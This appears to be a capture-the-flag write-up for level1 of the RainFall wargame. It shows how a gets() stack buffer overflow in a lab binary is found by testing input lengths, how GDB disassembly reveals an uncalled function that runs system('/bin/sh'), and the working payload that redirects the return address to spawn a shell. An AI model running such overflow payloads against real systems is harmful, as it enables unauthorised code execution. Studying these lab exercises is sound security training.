`gets` is being called and gets can be exploit via buffer overflow.

The program will crash with a big string.

By tring varius lenght if found :

```
level1@RainFall:~$ python -c "print('a' * 75)" | ./level1
level1@RainFall:~$ python -c "print('a' * 76)" | ./level1
Illegal instruction (core dumped)
level1@RainFall:~$ python -c "print('a' * 77)" | ./level1
Segmentation fault (core dumped)
```

Illegal instruction is the proof there's an overflow, so we will attack with a buffer overflow of 76.

Knowing why it's 76 can be good, it guess the buffer is 64 bytes long (char buffer[64]) and it took 12 more bytes to reach the return adresse of gets

GDB dissas
```
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp    
   0x08048486 <+6>:     sub    $0x50,%esp
   0x08048489 <+9>:     lea    0x10(%esp),%eax     
   0x0804848d <+13>:    mov    %eax,(%esp)
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
End of assembler dump.
(gdb) disass run
Dump of assembler code for function run:
   0x08048444 <+0>:     push   %ebp     
   0x08048445 <+1>:     mov    %esp,%ebp
   0x08048447 <+3>:     sub    $0x18,%esp
   0x0804844a <+6>:     mov    0x80497c0,%eax
   0x0804844f <+11>:    mov    %eax,%edx
   0x08048451 <+13>:    mov    $0x8048570,%eax
   0x08048456 <+18>:    mov    %edx,0xc(%esp)
   0x0804845a <+22>:    movl   $0x13,0x8(%esp)
   0x08048462 <+30>:    movl   $0x1,0x4(%esp)
   0x0804846a <+38>:    mov    %eax,(%esp)
   0x0804846d <+41>:    call   0x8048350 <fwrite@plt>
   0x08048472 <+46>:    movl   $0x8048584,(%esp)
   0x08048479 <+53>:    call   0x8048360 <system@plt>
   0x0804847e <+58>:    leave
   0x0804847f <+59>:    ret
End of assembler dump.
(gdb) x/s 0x8048584
0x8048584:       "/bin/sh"
(gdb) x/s 0x8048570
0x8048570:       "Good... Wait what?\n"
```

run is a function but is not called, no big deal we got everything !

"/bin/sh" will be called with system, that's exactly what we want and the address that starts this is **0x08048444**.

so by overflowing the buffer and calling the right address like this (adress is reversed because it's like this cpu reads adresses)

https://owasp.org/www-community/attacks/Buffer_overflow_attack

`python -c "print('a' * 76 + '\x44\x84\x04\x08')" | ./level1`

We did get the message "Good... Wait what?\n" but also got segfault right after. So we need to block the command

`(python -c "print('a' * 76 + '\x44\x84\x04\x08')"; cat) | ./level1`

`cat` will block the le shell `system` just gave us, in parenthesis so the pipe is for all the command